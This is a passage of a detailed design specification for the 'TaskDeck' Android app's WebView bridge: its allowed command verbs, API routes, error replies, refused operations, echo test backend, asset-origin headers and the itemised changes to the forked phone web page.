`POST /api/command` takes today's command JSON (`board::Command`, digest §2) unchanged, except where the "Change" column says so. The bridge parses the body only far enough to read `op` (a strict JSON parse into a value whose top level is an object with a string member `op`), refuses every `op` not in this table with `403 bridge/verb_refused`, answers a body that is not a JSON object with `400 bridge/bad_body` `{"error":"Could not read the command."}`, and hands the original text to `submit_json` (`device.md` §17.4), which parses it with `core.md` §12.2 (unknown fields ignored, as today).

| `op` | JSON the page sends (digest §2) | Change in the fork | Reply fields used by the page |
|---|---|---|---|
| `move_block` | `{op, id, session?, day, start, minutes}` | none | none |
| `set_notes` | `{op, text}` | `android`: `{op, text, base}` with `base` the snapshot's `notes_base` when the sheet opened (A-06) | none |
| `complete` | `{op, id, at}` | none | none |
| `restore` | `{op, id, archived_at}` | none | none |
| `delete` | `{op, id, at}` | none | none |
| `add_block` | `{op, id, day, start, minutes}` | none | `session` |
| `remove_block` | `{op, id, session}` | none | none |
| `rename` | `{op, id, name}` | none | none |
| `set_deadline` | `{op, id, deadline}` | none | none |
| `set_severity` | `{op, id, level}` | none | none |
| `set_horizon` | `{op, id, level}` | none | none |
| `set_estimate` | `{op, id, minutes}` | none | none |
| `unplan` | `{op, id}` | none | none |
| `set_repeat` | `{op, id, days, day}` | none | none |
| `quick_add` | `{op, name, deadline}` | none | none |
| `create` | `{op, kind, name, day, start, minutes}` | none | `id` |
| `reflow` | `{op, day}` | none | `moved` |

`session` in requests and replies is a sid (`core.md` §12.3, CORE-SNAP-002); the page treats it as an opaque number it read from the snapshot or a reply, so no change follows.

**Wire times the page sends.** The page sends `at` of `complete` and `delete` as the instant of the tap in UTC, RFC 3339 with whole seconds and `Z` (today's `stamp()`, `new Date().toISOString()` with its fraction removed, phone.html:4825), for example `"2026-11-22T08:00:00Z"`, which `core.md` §12.2 step 4 reads as `WireTime::Exact`. It sends `deadline` of `quick_add` as `null` when the user gave no due date (phone.html:5300), and otherwise as the value of its date-time field, `YYYY-MM-DDTHH:MM` local (`WireTime::Naive`). The members of every body are in the order the table lists them, and the request key travels in the `X-TaskDeck-Request` header (`headers.request_key`, §5.2), not in the body.

**The request key.** The bridge keeps, per process, the replies of the last 1,024 verbs that carried a `request_key`, in insertion order. A verb whose key is held is answered with the held reply and is not submitted again; a key is held only after a 2xx reply (errors are not held, as today, digest §3.6). Two verbs with the same key never run at once, because `bridge-io` runs one request at a time. A reply is held as its status and body.

- **BRIDGE-VERB-001** (android-shell) The bridge MUST answer `POST /api/command` whose `op` is not one of the 17 of §6.3 with `403 bridge/verb_refused` and the body `{"error":"That is not something this phone can do."}`, without calling the facade.
- **BRIDGE-VERB-002** (android) The `full` flavour MUST pass the body of an accepted verb to `submit_json` unchanged, and MUST build the 200 reply as `{"ok": true, "version": view_version}` followed by `id`, `session` and `moved` exactly when the `Reply` holds them.
- **BRIDGE-VERB-003** (android-shell) A verb whose `request_key` is among the last 1,024 keys answered with a 2xx status MUST be answered with that held reply and MUST NOT be submitted again.

### 6.4 The other routes

#### 6.4.1 `GET /api/state`

`from` and `days` are read from the query as today (phone.rs:962-981): `from` absent means today in the device's zone (`Published::zone()` applied to the device clock); present, it is `chrono::NaiveDate` of `YYYY-MM-DD` with a year from 1970 to 9999, else `400` with ``{"error":"`from` should be a date like 2026-09-04, not `<text>`."}``; `days` absent means 1; present, it parses as `u32`, else `400` with ``{"error":"`days` should be a number, not `<text>`."}``, and is then clamped to 1–31. `now` is the device clock in whole milliseconds. The body is `Published::answer_snapshot(from, days, now)` serialised by `serde_json`.

#### 6.4.2 `GET /api/weather`

With no report (`Published::weather()` is `None`): `503` with today's `{"error":"No forecast yet. TaskDeck fetches one when it starts and every ten minutes after."}`. Otherwise the body is the report serialised as today (`weather::Report`, `core.md` §14.6), with three members added after its own:

| Member | Value |
|---|---|
| `for` | `"here"` when the third element of `Published::weather()` (the place the report was fetched for) is `Own`, else `"desk"` |
| `via` | `"phone"`: the phone always asks Open-Meteo itself (`device.md` §13.2) |
| `here` | `{"latitude": lat / 100, "longitude": lon / 100, "at": <ms or null>}` when `weather_place().1` is `Some`, else `null`; the two numbers are JSON numbers with at most two decimals, written from the integers exactly (`5237` → `52.37`, `-12` → `-0.12`) |

`taskdeck-android` writes `"at": null`; the shell replaces it with the value of `own_place_at_ms` from its `shell` preferences (§8.4) when that is present. The page keeps the name `desk` for the board's home place (its words change, S-11).

#### 6.4.3 `POST /api/look`

The body is a JSON object with integer members `blur` and `light`, each 0 to 4,294,967,295; other members are ignored (today's `serde`, phone.rs:837-851). Anything else: `400 {"error":"That is not a pair of dials."}`. The facade gets `set_look_dials(min(blur, 100), min(light, 100))`. The reply's `id` is the value `set_look_dials` returned (the id of the look now shown, §7.4, or `null`), and `kept` is `true` exactly when it is not `null`.

#### 6.4.4 `POST /api/background`

| Request | Checks, in order | Facade | Reply |
|---|---|---|---|
| `headers.clear` and no body | none | `clear_own_picture()` | `{"ok": true, "id": <the id clear_own_picture returned, or null>}` |
| `body_b64` | decoded length 1 to 6,291,456 bytes, else `400 bridge/picture_too_large` `{"error":"That request is too large."}`; the first three bytes `FF D8 FF`, else `400 bridge/picture_format` `{"error":"That file is not a picture this can read."}` | `set_own_picture(bytes)` | `{"ok": true, "id": <the id set_own_picture returned>}` |
| neither, or both | — | none | `400 bridge/picture_format` as above |

Facade errors map as §6.5 states; `device/needs_sync` (a phone not yet paired) answers `400 {"error":"Pair this phone with the board first; then it can keep a picture of its own."}`. The own picture is the phone's own Look (SYNC.md §3: "its own Look"); it never syncs. "Use the desk's picture" clears it, and the phone shows the board's shared picture again.

#### 6.4.5 `POST /api/place`

The body is `{"source": "own"}` or `{"source": "home"}`; anything else is `400 bridge/bad_body` `{"error":"That is not a place."}`.

`home`: `Native.call("set_weather_place", {"source": "home"})`; the shell removes `own_place_at_ms`; reply `{"ok": true, "here": null}`.

`own`, in order (V1-9: the location is asked natively at every request, never watched):

1. If `ACCESS_COARSE_LOCATION` is not granted, the shell asks for it through `MainActivity.requestPermissions` and waits for the answer. Refused: `403 bridge/location_denied` `{"error":"TaskDeck was not allowed to say where the phone is. Allow location for TaskDeck in the phone's settings and try again."}`.
2. Location, with a 15,000 ms limit: `LocationManager.getLastKnownLocation` of the provider below, when it is at most 300,000 ms old (today's `maximumAge`, phone.html:3879); else one fresh fix. API 31 and later: provider `fused` when `LocationManager.hasProvider("fused")`, else `network`; one fix by `getCurrentLocation(provider, CancellationSignal, executor, consumer)`. API 26 to 30: provider `network`; one fix by `getCurrentLocation` on API 30, and `requestSingleUpdate(provider, listener, looper)` below. No provider enabled, or a `null` fix: `503 bridge/location_unavailable` `{"error":"The phone could not work out where it is."}`. The limit passes: the request is cancelled and the answer is `504 bridge/location_timeout` `{"error":"Asking where the phone is took too long."}`.
3. `lat = round_half_away_from_zero(latitude × 100)`, `lon` likewise, as integers (`device.md` §13.2); `Native.call("set_weather_place", {"source": "own", "lat": lat, "lon": lon})`.
4. The shell stores `own_place_at_ms` = the fix's time (`Location.getTime()`) in its `shell` preferences; the reply is `{"ok": true, "here": {"latitude": lat / 100, "longitude": lon / 100, "at": own_place_at_ms}}`.

In the `echo` flavour step 3 records the place in the echo backend (§6.7) instead.

- **BRIDGE-ROUTE-004** (android-shell) `POST /api/place` with `own` MUST ask the platform for one location fix by the steps of §6.4.5 at every request, MUST NOT register a continuing location listener, and MUST pass only coordinates rounded to hundredths of a degree to the core.
- **BRIDGE-ROUTE-005** (android-shell) The shell MUST NOT store the phone's own coordinates in any file, preference or database; of the place it keeps only `own_place_at_ms`.

#### 6.4.6 Notices and the notes merge (`android`)

`POST /api/notice` dismisses one record shown in the notice banner (A-04): the body's `seq` and `index` (integers 0 to 2^53 − 1) are those of the `notices` event. An unknown pair is not an error (`200 {"ok": true}`), because the record may have been dismissed on another path.

`GET /api/notes_merge` answers `notes_merge()` (`device.md` §17.6): `{"merge": null}` when there is none, else `mine` (the refused text), `theirs` (the board's current notes), `base` and `current` (revisions). `POST /api/notes_resolve` submits the merged text with `resolve_notes`, and is answered like a verb (row 3, §6.5). `POST /api/notes_discard` calls `discard_notes_draft`.

#### 6.4.7 `POST /api/screen` (`android`)

Starts `DevicesActivity`, `PairActivity` or `HealthActivity` (§13) with an explicit intent, on the main thread. A second request within 1,000 ms of the last accepted one is answered `429 bridge/busy` and starts nothing, so a script in the page cannot flood the screen with activities. The activities offer nothing without the user's own taps.

- **BRIDGE-ROUTE-006** (android) `POST /api/screen` MUST start only the three activities of §6.4.7, by explicit intent, at most once per 1,000 ms.

### 6.5 Error replies

Every error reply's body is `{"error": <message>}` (today's `json_error`, digest §3.2). A facade `DeviceError` maps as follows, first matching row:

| `DeviceError.code` | Status | Message |
|---|---|---|
| a `core/` compile code (`core.md` §16, intent and compile table) | its `status` (400 or 410) | its `message` |
| `engine/not_joined` | 503 | This phone is still joining the board. Try again in a moment. |
| `engine/revoked` | 409 | This phone was removed from the board. Open Devices to pair it again. |
| `engine/clock_unconfirmed` | 409 | The phone's clock looks wrong. Open Devices to confirm it. |
| `engine/trial_panic` | 500 | TaskDeck could not do that: it hit a fault, and nothing was changed. |
| an apply refusal code (`core.md` §16, apply table) from `EnqueueRefused` | 409 | TaskDeck refused that (`<code>`). |
| `device/write_failed` | 500 | TaskDeck could not save that. Nothing was changed. |
| `device/needs_sync` | 400 | Pair this phone with the board first; then it can keep a picture of its own. |
| `device/picture_too_large` | 400 | That request is too large. |
| `device/picture_format`, `device/picture_decode` | 400 | That file is not a picture this can read. |
| `device/closed`, `device/wrong_mode` | 503 | TaskDeck's board is not open. Close the app and open it again. |
| any other code | 500 | TaskDeck could not do that (`<code>`). |

The bridge's own codes (§17) answer with the status and message §6 gives them. When the core host is not `Open` (the request came before the core opened, or it failed), every Rust row answers `503 bridge/not_open` `{"error":"TaskDeck's board is not open. Close the app and open it again."}`.

- **BRIDGE-ROUTE-007** (android) The `full` flavour MUST map every facade error to the status and message of the first matching row of §6.5.

### 6.6 What the bridge refuses

Everything not in §6.2 is refused. By name, so that a test lists each:

- **Verbs** (`403 bridge/verb_refused`, BRIDGE-VERB-001): `add`, `forget`, `forget_archived`, `add_subscription`, `remove_subscription`, `rename_subscription`, `set_subscription_color`, `set_subscription_enabled`, `set_palette`, `set_home`, `set_picture`, the queries `snapshot`, `feed` and `board`, and every other `op`, including one that is absent or not a string (SYNC.md §7: never subscription, device, key or relay operations; today `/api/command` takes any command, phone.rs:887-928).
- **Today's routes** (`404 bridge/no_route`): `GET /api/wait` (the long poll, now the `changed` event), `GET /api/board` (the whole board with subscription URLs), `GET /calendar.ics`, `GET /manifest.webmanifest`, `GET /sw.js`, `GET /icon.png`, `GET /icon-192.png`, `GET /icon-512.png` (asked for as assets by the WebView, the last five get the asset handler's 404 of §7.1 instead, §7.5), and every `HEAD` and `OPTIONS`.
- **Administration**: no route reaches any facade method of `device.md` §17.2 (`open` and `shutdown` belong to the core host, §4.3), §17.7, §17.8, §17.9, §17.10 or §17.11 (pairing, joining, re-pairing, SAS, revoking, replacing, adopting, Skip, "use this copy", the clock and rejoin confirmations, banners, alarms, operations, move codes, following an address, forgetting an identity, restoring, purging, rules overrides, background sync, foreground state, the zone, backups), nor `set_shared_picture`, `clear_shared_picture`, `set_reminder_leads`, `export_legacy` or `import_check`. These are reached only from the native screens through `Native.call` (§11.4).
- **Keys and relay**: nothing on the bridge carries a key, a token, a relay address, a door, a code or a SAS, in either direction.

- **BRIDGE-ROUTE-008** (android-shell) The bridge MUST refuse each verb and route listed in §6.6 with the status and code given there, and the allow-list test MUST send every one of them.

### 6.7 The echo backend (`android-shell`)

The `echo` flavour builds `taskdeck-android` with `--no-default-features --features backend-echo` (so without the default `backend-device`, §11.1), and links no `taskdeck-device`. It exists so that the shell, the fork, the WebView hardening, the bridge and the timing harness are tested before the device runtime exists (SYNC_PLAN.md §6.6: "the bridge answers from the fixtures and an in-memory echo"). It holds, in memory:

| State | Initial value | Changed by |
|---|---|---|
| `version` | 1 | +1 for every accepted verb, `look`, `background` and `place` request |
| `verbs` | `[]` | each accepted verb's body text, appended |
| `notes` | the fixture's `notes` | an accepted `set_notes` (its `text`) |
| `dials` | the fixture's `dials` | `POST /api/look` |
| `own_picture` | none | `POST /api/background` (the bytes are kept as they came; no decoding: the echo has no image code) |
| `place` | `home` | `POST /api/place` |
| `creates`, `blocks` | 0 | `create` and `quick_add`; `add_block` |

**Fixtures** (`foundation` writes them, §20; `taskdeck-android`'s `build.rs` embeds them): under `fixtures/phone/`:

| File | Content |
|---|---|
| `small/meta.json` | `{"board": "small", "now": "2026-01-05T12:00:00Z", "tz": "UTC", "first": "2025-10-27", "last": "2026-05-15"}`: the pinned clock, the zone and the first and last day recorded |
| `small/days.json` | `{"base": <today's snapshot JSON for from = 2026-01-05, days = 1, at the pinned clock>, "days": {"<YYYY-MM-DD>": <that day's DaySnapshot>, …}}`, one `DaySnapshot` for every day from `first` to `last` inclusive (201 days), each from today's `phone::snapshot` with `days = 1` |
| `weather.json` | one `weather::Report` JSON from today's `build_report` over a recorded Open-Meteo answer for `52.37, 4.89` |
| `look.jpg` | a 720 × 1560 baseline JPEG of at most 262,144 bytes, made of flat colour bands (no photograph) |

**Answers**:

| Route | Echo answer |
|---|---|
| `GET /api/state` | `base` with `version` = `version`, `notes` = `notes`, `notes_base` = the number of accepted `set_notes`, `dials` = `dials`, `look` = the own picture's look when set (id §7.4 over `look.jpg`'s bytes when no own picture was posted; the posted bytes' id when one was), and `days` = the recorded `DaySnapshot` of each requested day in order; a requested day outside `first`–`last`: `400 bridge/echo_range` `{"error":"The echo bridge has no fixture for that day."}`. Query handling as §6.4.1 with "today" = `2026-01-05`. |
| `GET /api/weather` | `weather.json` with `for`, `via`, `here` as §6.4.2 from `place` |
| `POST /api/command` | checks the verb's shape by the table below; a failing check is `400 {"error":"Could not read the command: <field>"}`; else `{"ok": true, "version": version}`, plus `id: 1000000 + creates` for `create` and `quick_add`, `session: 1000 + blocks` for `add_block`, `moved: 0` for `reflow` |
| `POST /api/look`, `POST /api/background`, `POST /api/place` | as §6.4, against the echo state |
| `GET /api/echo` | `{"version": version, "verbs": [<each accepted body, as a JSON string>], "dials": dials, "place": "home" or "own", "own_picture_bytes": <length or null>}` |

**Shapes** the echo checks (JSON types only; the real meaning is `core.md`'s): `id` an integer ≥ 0 wherever it appears; `session` an integer ≥ 0, `null` or absent; `day` a string of the form `YYYY-MM-DD`; `start` an integer; `minutes` an integer ≥ 0; `name`, `text` strings; `at`, `deadline` a string, `null` or absent; `archived_at` a string; `level`, `days` integers 0 to 255; `kind` one of `task`, `event`, `routine`. The required fields per verb are those of §6.3's second column without `?`.

The instrumented tests of `android-shell` drive the page with the pinned clock of §16.4 and the emulator zone `UTC`, so the page asks for days inside the fixtures, and they assert on `GET /api/echo` that each control of the page sends the exact verb JSON listed for it in the test vectors (§19).

- **BRIDGE-ECHO-001** (android-shell) The echo backend MUST answer every route of §6.7 exactly as its table states, from the fixtures of §6.7 and its in-memory state.
- **BRIDGE-ECHO-002** (android-shell) The `echo` flavour MUST have no release variant, MUST carry the application id suffix `.echo`, and MUST NOT link `taskdeck-device`.
- **BRIDGE-ECHO-003** (android-shell) `EchoBackend::from_fixtures` MUST pass the byte string `taskdeck-echo-backend` to `std::hint::black_box`, so that every build with the echo backend contains it and `release` can prove a release `libtaskdeck.so` does not (§20).

## 7. The asset origin

### 7.1 Origin and paths

The page is loaded from `https://appassets.androidplatform.net/index.html`. One `WebViewAssetLoader` is built with a single path handler for `/` (the `PageAssets` handler), and `WebViewClient.shouldInterceptRequest` hands it every request. The handler answers every path itself and never returns `null`, because an unmatched request would otherwise go to the network (R2 §7).

| Request | Answer |
|---|---|
| `GET https://appassets.androidplatform.net/index.html` or `…/` | the page (§7.2) |
| `GET …/weather/<stem>.svg`, `<stem>` one of the 28 of §7.3 | the bundled SVG (§7.3) |
| `GET …/bg-<id>.jpg`, with or without a query | the picture (§7.4) |
| any other path on the asset origin, any other method | `404`, `application/json; charset=utf-8`, `{"error":"No such page."}` |
| any URL on any other origin or scheme (the handler is asked for every request `shouldInterceptRequest` sees) | `403`, `text/plain; charset=utf-8`, empty body |

Every answer carries `Cache-Control: no-store`, `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer`.

- **BRIDGE-ASSET-001** (android-shell) `shouldInterceptRequest` MUST return a non-null `WebResourceResponse` for every request, answering exactly as the table of §7.1 states.

### 7.2 The page and its response headers

The APK carries the page as the asset `page/index.html`, copied byte for byte from `android/page/index.html` at build time. The page holds the placeholder `<!--td-prefs-->` exactly once, inside `<head>` before the main script; when serving, the handler replaces it with `<script type="application/json" id="td-prefs">` ‖ the preferences JSON of §8.4 with every `<` written as the six characters `\u003c` ‖ `</script>`. A data block of type `application/json` is not executed, so it needs no script hash.

Headers of the page's answer, besides those of §7.1:

| Header | Value |
|---|---|
| `Content-Type` | `text/html; charset=utf-8` |
| `Content-Security-Policy` | the policy of §9.4, with `frame-ancestors 'none'` |
| `Cross-Origin-Opener-Policy` | `same-origin` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), display-capture=(), usb=(), serial=(), hid=(), bluetooth=(), payment=(), publickey-credentials-get=(), clipboard-read=(), clipboard-write=()` |

### 7.3 Sky symbols

The 28 stems of today's `sky_symbols!` table (src/weather.rs): `01d`, `01n`, `02d`, `02n`, `03d`, `03n`, `04`, `15`, `46`, `09`, `10`, `47`, `48`, `49`, `13`, `50`, `40d`, `40n`, `05d`, `05n`, `41d`, `41n`, `44d`, `44n`, `45d`, `45n`, `22`, `11`. The Gradle build copies exactly these 28 files from the repository's `weather_svgs_2/` (read only) into the APK's `page/weather/`, and fails when one is missing. They are served as `image/svg+xml`. The handler looks the stem up in a fixed Kotlin set of these 28 strings; it never joins a path from the URL (today's rule, weather.rs:582-590).

- **BRIDGE-ASSET-002** (android-shell) The handler MUST serve a sky symbol only for a stem in the fixed set of §7.3, compared exactly, and MUST answer any other `/weather/` path with the 404 of §7.1.

### 7.4 The picture

The page shows a picture as today: `snap.look = {id, aspect, top}` and the CSS `url("/bg-<id>.jpg")` (S-07). The picture the phone shows is, in order: its own picture when it has one (§6.4.4), else the board's shared picture once the device has processed it (`device.md` §14.2), else none. Either way the bytes are the `look` JPEG the device made in Rust: decoded as JPEG only, under `image::Limits`, re-encoded, never the bytes another device sent (V1-14, V3-12, DEV-PIC-002). `id` is the lowercase hex of the first 8 bytes of `SHA-256(look)` (16 characters, `device.md` §14.2 step 8).

The handler answers `GET /bg-<id>.jpg` by calling `Native.picture(id)` (§11.2) on the WebView's request thread: when `id` equals the id of the picture shown now, the result is the look's bytes in base64, which the handler decodes and serves as `image/jpeg`; otherwise the result is empty and the answer is the 404 of §7.1. The query string is ignored.

- **BRIDGE-ASSET-003** (android) The handler MUST serve under `/bg-<id>.jpg` only the `look` bytes of `Published::picture()` whose id equals `<id>`, and MUST NOT serve any other bytes under that path.
- **BRIDGE-ASSET-004** (android) The shell MUST NOT hand the WebView any bytes of a synced blob or of the phone's own uploaded picture other than the re-encoded `look` of §7.4.

### 7.5 Everything else

There is no service worker, no manifest, no icon link and no Open-Meteo request from the page (§8). Their old paths (`/sw.js`, `/manifest.webmanifest`, `/icon.png`, `/icon-192.png`, `/icon-512.png`, `/calendar.ics`, `/api/*`) are answered by the 404 of §7.1 when the WebView asks for them; the bridge routes of §6 are never reachable as asset requests.

## 8. Changes to the forked page

### 8.1 Rules for the fork

`android-shell` creates `android/page/index.html` as a byte-for-byte copy of the fork base (§2) and then makes the changes S-01 to S-20 of §8.2; `android` then makes A-01 to A-09 of §8.3. A reviewer checks `diff -u src/phone.html android/page/index.html`: every hunk belongs to exactly one item, and every item's result holds. Comments inside a changed hunk may be rewritten so that they stay true; comments elsewhere are not touched. A function or constant that an item leaves without any caller may be removed in that item's hunk or kept; either is a pass. `src/phone.html` itself is not edited (SYNC_PLAN.md §2); it stays frozen with today's server until `desktop` deletes both.

Line numbers are the fork base's (§2). The page stays one file with one inline `<script>` and one `<style>`.

- **BRIDGE-FORK-001** (android-shell) Every difference between the fork base and `android/page/index.html` after `android-shell` MUST belong to one of the items S-01 to S-20 of §8.2, and every item's stated result MUST hold.
- **BRIDGE-FORK-002** (android) Every difference between the fork base and `android/page/index.html` after `android` MUST belong to one of the items S-01 to S-20 or A-01 to A-09, and every item's stated result MUST hold.
- **BRIDGE-FORK-003** (android-shell) The page MUST contain exactly one inline `<script>` element without a `type` attribute, and no `<script>` element with a `src` attribute.

### 8.2 Changes in `android-shell`

**S-01. The head** (phone.html:4-18).
- Remove the comment and the two `<link>` elements for the icons (phone.html:11-17): the WebView draws no tab strip and the page holds no `<link>` (§9.6).
- Insert, directly after `<meta charset="utf-8">`, `<meta http-equiv="Content-Security-Policy" content="…">` with the policy of §9.4 without its `frame-ancestors` directive (a `<meta>` policy cannot carry it).
- Insert `<!--td-prefs-->` on its own line directly before `</head>` (§7.2).
- Result: the head holds no `<link>`; the meta policy equals §9.4 minus `frame-ancestors 'none'`, with the script hash of the page's own script (§9.4).

**S-02. `api()`** (phone.html:1232-1274). The function keeps its name, its parameters `(path, options = {})`, its promise and `ApiError`. Its body becomes:
1. `method = options.method || 'GET'`.
2. `options.body`: a string becomes `body`; an `ArrayBuffer` becomes `body_b64`, the standard base64 with padding of its bytes; absent stays absent.
3. `options.headers`: `X-TaskDeck-Request` becomes `headers.request_key`; `X-TaskDeck-Clear` becomes `headers.clear: true`; every other header is dropped (there is no token and no content type).
4. When the port is missing (`window.TaskDeckBridge` was undefined at the script's start): throw `new ApiError(0, "TaskDeck's board is not open. Close the app and open it again.")`.
5. Send a `req` (§5.2) through the bridge client (S-03) and wait for its `res`, at most 15,000 ms (`POST /api/place` 30,000 ms, `POST /api/background` 60,000 ms). On timeout: throw `new ApiError(0, 'TaskDeck did not answer in time.')`.
6. On `status` 200 to 299: return `body`, or `null` when it is absent. Otherwise throw `new ApiError(status, (body && body.error) || 'TaskDeck answered ' + status + '.')`.
- Result: the page calls `fetch` nowhere; `REQUEST_TIMEOUT_MS` stays 15,000; `WAIT_TIMEOUT_MS` is removed.

**S-03. The bridge client** (new, inserted directly after `class ApiError`, phone.html:1274). One `const bridge` object built at the script's start, which:
- reads `window.TaskDeckBridge` once into a closure and never again;
- draws `load` (16 bytes of `crypto.getRandomValues`, lowercase hex) and posts `{"v":1,"k":"ready","load":…}` at once when the port exists;
- numbers requests from 1 upward, keeps the waiting ones in a `Map` by `id`, and resolves each with its `res`;
- sets `TaskDeckBridge.onmessage`, parses `event.data` with `JSON.parse`, ignores a message that does not parse or does not match §5.3, a `res` for an `id` it does not wait for, and an `ev` it has no listener for;
- offers `bridge.on(name, fn)` for events, `bridge.hello` (a promise of the `hello` data), `bridge.mark(name)` (posts a `mark`), and `bridge.nextChange(seen, ms)`: a promise resolved with `{version}` by the first `changed` event whose `version` differs from `seen`, or after `ms` milliseconds with `{version: seen}`.
- Result: this object is the only code in the page that touches `TaskDeckBridge`.

**S-04. Storage.** Every use of the identifier `localStorage` (38 in the fork base) is replaced by `store`, an object defined before its first use (inserted directly before phone.html:1031) with `getItem(key)`, `setItem(key, value)`, `removeItem(key)`, `key(index)` and `length`, holding string values in an in-memory `Map` that lives as long as the page load. At the script's start it is seeded from the `td-prefs` block (§7.2) by §8.4's mapping. `setItem` and `removeItem` of a mapped key also post `POST /api/prefs` (§8.4) without waiting for the answer. `setItem` throws `new DOMException('The store is full.', 'QuotaExceededError')` when the total length of all keys and values would exceed 4,194,304 UTF-16 code units, so the page's existing quota branches behave as they did with `localStorage`.
- Result: the page contains no `localStorage`, `sessionStorage`, `indexedDB`, `caches` or `document.cookie`, and nothing it stores outlives the page load except the mapped preferences.

**S-05. The token.** Remove `TOKEN_KEY`, `state.token`, `readToken`, `installManifest` and its call, the `X-TaskDeck-Token` header, every `?token=` in a URL, the gate's `<input id="gateToken">` and `#gateGo` button with its listener (phone.html:5467-5471), and every branch that tests `error.status === 401` (phone.html:1564, 1724, 1783-1787, 1793-1794, 2538, 2835, 5569); the bridge never answers 401.
- Result: no identifier, string or URL in the page's script names a token; the page assigns `location` nowhere and tests no status 401.

**S-06. The panel.** The `#gate` element (phone.html:940-946) becomes `<div class="gate" id="gate" hidden><h2>TaskDeck</h2><p id="gateNote" hidden></p><div class="actions" id="gateActions"></div></div>`. `showGate()` becomes `showPanel(text, action)`: it hides what `showGate` hid, sets `#gateNote`'s text, fills `#gateActions` with one button when `action = [label, fn]` is given, and shows `#gate`; `hidePanel()` undoes it.
- Result: the panel shows only the texts of §5.8 and A-03; it has no input.

**S-07. The picture** (phone.html:2355-2408). `paintField` sets `--photo` to `url("/bg-${look.id}.jpg")` with no query. `PHOTO_CACHE`, `keepPhoto` and its call are removed.
- Result: the picture is requested only by CSS, from the asset origin (§7.4).

**S-08. The sky symbols** (phone.html:3938-3952, 2039, 5678). `SKY_WARM_KEY`, `warmSymbols` and its two calls are removed; `<img src="/weather/${sym}.svg">` stays.
- Result: each symbol is requested only by an `<img>`, from the bundled assets (§7.3).

**S-09. Open-Meteo** (phone.html:3022-3138 for `OPEN_METEO`, `buildReport` and `fetchForecast`; 2814-2853 for `loadWeather`). `OPEN_METEO`, `buildReport` and `fetchForecast` are removed. In `loadWeather`, the body of the `try` becomes: `report = await api('/api/weather')`, then the existing `if (report && Array.isArray(report.hours)) { … adoptWeather(report, at); keepWeather(report, at); }`. The fallback to Open-Meteo for the desk's place is removed.
- Result: the page asks only `GET /api/weather` for a forecast; `connect-src 'none'` holds (§9.4).

**S-10. The place** (phone.html:2759-2812, 3852-3887, 3908-3920).
- Remove `PLACE_KEY`, `DESK_KEY`, `recallPlace`, `keepPlace`, `keepDesk` and their calls.
- `adoptWeather`: replace the `if (report.for !== 'here') { … }` block by: `state.weather.here = report.here || null; state.weather.desk = report.for === 'desk' ? { latitude: report.latitude, longitude: report.longitude, place: report.place } : state.weather.desk;`.
- `locateMe`: replace `navigator.geolocation.getCurrentPosition(…)` by `api('/api/place', { method: 'POST', body: JSON.stringify({ source: 'own' }) })`; on success `wx.here = answer.here`, then `renderWxPlace()` and `loadWeather({ force: true })`; on failure `wx.placeNote = error.message` and `renderWxPlace()`; `wx.locating` is set and cleared around it as before. The first line's `!navigator.geolocation ||` test is removed.
- `useDesksPlace`: posts `{ source: 'home' }` to `/api/place` the same way before `loadWeather({ force: true })`.
- `renderWxPlace`: `canLocate` is `true`; the note "This page cannot ask where the phone is: browsers only allow that over https." is removed; when `wx.here.at` is `null`, the text ` · where this phone was at <time>` is left out.
- Result: the page calls no `navigator.geolocation`; the device owns the place (`device.md` §13.2).

**S-11. Weather words.** Exactly these strings change:
- phone.html:3906 `"The desk's place, once the desk has said where that is"` → `"The board's home place, once a forecast for it has arrived"`;
- phone.html:4004-4006, the second branch of `wxNone`, becomes `'Until this phone is given a place of its own — Use my location, below — the forecast is for the board’s home place, which is set on a desktop. The last one seen is kept.'`.
- Result: no text says the forecast comes from the desk.

**S-12. The boot** (phone.html:5645-5695). The `state.token = readToken(); if (!state.token) { showGate(); } else { … }` statement becomes: start two timers (500 ms: `showPanel('Opening the board…')`; 20,000 ms: `showPanel('TaskDeck is taking too long to open the board. Close the app and open it again.')`); `bridge.hello.then((hello) => { clear both timers; hidePanel(); … })`, whose body is: for `hello.mode === 'key_lost'` the panel of §5.8 with the action `['Open Devices', () => api('/api/screen', { method: 'POST', body: '{"name":"devices"}' })]` (in `echo`, the action is absent); for `'failed'` the panel of §5.8 with `hello.code`; otherwise the former `else` branch without `installManifest()`, `recallPlace()` and `warmSymbols()`.
- Result: no request is sent before `hello` (BRIDGE-MSG-014).

**S-13. The service worker** (phone.html:5696-5700). The comment and the `navigator.serviceWorker.register('/sw.js')` statement are removed.
- Result: the page contains no `serviceWorker`.

**S-14. The long poll** (phone.html:5537-5574). In `watch()`, the call `api('/api/wait?version=' + seen)` (written with a template string at phone.html:5553) becomes `await bridge.nextChange(seen, 25000)`; the comment above `watch` is updated; the rest of the loop stays.
- Result: no request to `/api/wait`; a board change reaches the page within the latency of §5.4.

**S-15. The Look sheet** (phone.html:4542-4716).
- The kindline (phone.html:4546) ends "It is cropped here and kept on this phone." instead of "… kept on the desk.".
- `hint.textContent = 'Saved. It is on the desk now.'` (phone.html:4628) becomes `'Saved.'`.
- "Use the desk's picture" (phone.html:4684) posts `api('/api/background', { method: 'POST', headers: { 'X-TaskDeck-Clear': '1' } })` with no `body`, which fixes today's 415 (digest §1.2 row 6).
- `sendBackground` is unchanged: it posts the canvas JPEG as an `ArrayBuffer`, which S-02 sends as `body_b64`.
- Result: the phone keeps its own picture; the desk's is the board's shared picture.

**S-16. Trusted Types** (phone.html:1068-1082). Before `el`, `const tt = trustedTypes.createPolicy('taskdeck', { createHTML: ttHtml })`, with `ttHtml` the function of §9.5; in `el`, `node.innerHTML = v` becomes `node.innerHTML = tt.createHTML(v)`.
- `ttHtml` stands alone between the comment lines `/* td:ttHtml:begin */` and `/* td:ttHtml:end */`, using no other name of the page, so that CI can run it in Node 22 against the vectors of §19.
- Result: the page's one HTML sink goes through the one policy (§9.5).

**S-17. Error words.** In `api()` the two `ApiError(0, …)` texts are those of S-02 steps 4 and 5; no other text names "the desktop", "the same network" or "running".
- Result: phone.html:1265 and 1267's texts appear nowhere.

**S-18. The first-day mark** (phone.html:1694-1722). In `load()`, after the first successful `render()` or `renderDeck()` of the page load, the page calls `requestAnimationFrame(() => requestAnimationFrame(() => bridge.mark('first_day')))` once.
- Result: exactly one `mark` per page load (§16.2).

**S-19. The bridge events.** `bridge.on('weather', () => { if (state.mode === 'weather') loadWeather({ force: true }); })` and `bridge.on('picture', () => load({ quiet: true }))` are added next to the `online` listener (phone.html:5629).
- Result: a new forecast and a new picture show without a poll.

